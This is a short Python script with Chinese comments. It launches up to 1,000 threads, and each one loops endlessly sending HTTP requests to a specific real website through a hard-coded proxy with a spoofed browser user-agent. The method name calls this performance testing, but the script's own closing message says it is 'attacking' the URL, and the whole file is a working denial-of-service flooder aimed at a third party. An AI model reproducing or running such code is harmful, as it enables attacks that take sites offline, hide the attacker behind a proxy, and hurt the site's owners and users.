# -*- coding:utf-8 -*-
# Python Version: 3.5
#
import threading
import time
import urllib.request;
import urllib.parse;

# 同时运行的线程数 （每个电脑能开的线程数不同（我：893个线程），如果超过了系统的最大负荷，则只创建能创建的最大线程数）
THREADS_COUNT = 1000

# 已创建的线程数
CREATED_THREAD = 0
# 死亡的线程数
DEAD_THREAD = 0

url = 'http://www.yangqq.com/'
proxyIp = '124.240.187.78:81';
userAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0'
proxy_handler = urllib.request.ProxyHandler({'http': proxyIp})
proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()
opener = urllib.request.build_opener(proxy_handler, proxy_auth_handler)


# 线程类
class RequestThread(threading.Thread):
    # 构造函数
    def __init__(self, thread_name):
        threading.Thread.__init__(self)

    # 线程运行的入口函数
    def run(self):
        try:
            while True:
                self.test_performance()
        except:
            global CREATED_THREAD, DEAD_THREAD
            DEAD_THREAD += 1
            print('your have a new dead thread , now you still have threads:', CREATED_THREAD - DEAD_THREAD)

    # 链接测试服务器
    def test_performance(self):
        global url
        try:
            req = urllib.request.Request(url)
            req.add_header('User-Agent', userAgent)
            # 添加头信息
            opener.addheaders = [
                ('User-Agent', userAgent)
            ]
            # 数据请求
            response = opener.open(url)
            print('成功了')
            # print('成功了',str(response.read().decode('utf-8')))
        except Exception as e:
            print('出错了.....' , e)

try:
    while THREADS_COUNT > 0:
        t = RequestThread("thread" + str(THREADS_COUNT))
        t.start()
        THREADS_COUNT += -1
        CREATED_THREAD += 1
except:
    print('线程数已达上限：', CREATED_THREAD, '个')
finally:
    print(time.strftime('%Y-%m-%d %H:%M:%S'), ':', 'attacking', url, '....')


